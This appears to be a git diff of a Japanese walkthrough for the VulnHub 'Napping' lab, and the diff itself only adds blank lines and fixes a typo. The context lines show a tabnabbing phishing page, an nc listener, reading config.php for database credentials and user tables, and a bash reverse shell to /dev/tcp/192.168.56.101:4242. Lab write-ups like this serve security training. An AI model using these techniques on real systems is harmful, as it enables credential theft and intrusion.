@@ -56,6 +56,7 @@ mkdir /home/user/vulnhub/napping
   cp Login.html get_info.html
   ```
 - evil.html作成（親Windowsのlocationプロパティを罠ページに変更）
+  
   **vi evil.html**
   ```bash
   <!DOCTYPE html>
@@ -76,6 +77,7 @@ sudo python3 -m http.server 80
 nc -lvnp 31337
 ```
 **準備完了**
+
 10.タブナビング攻撃　開始
 - シナリオ
   
@@ -90,6 +92,7 @@ nc -lvnp 31337
 ssh daniel@$IP
 ```
 *<以下、daniel>*
+
 12.現状を把握する
 ```bash
 cat /etc/passwd | grep daniel
@@ -97,6 +100,7 @@ id
 sudo -l
 ```
 - sudo -l : sudo権限の確認
+- 
 13.config.phpファイルの中身を確かめる
 ```bash
 cat /var/www/html/config.php
@@ -122,13 +126,14 @@ mysql -u adrian -p
 >select * from users\G
 ```
 - \Gは縦に表示させる
+  
 15.実行可能なファイルを検索
 **danielはAdministratorsグループに属していた**
 ```bash
 find / -group administrator 2> /dev/null
 ```
 16.リバースシェルの準備
-- /dev/shm下にrevshell.shを作榮
+- /dev/shm下にrevshell.shを作成
   ```bash
   /bin/bash
   bash -c 'bash -i >& /dev/tcp/192.168.56.101/4242 0>&1'
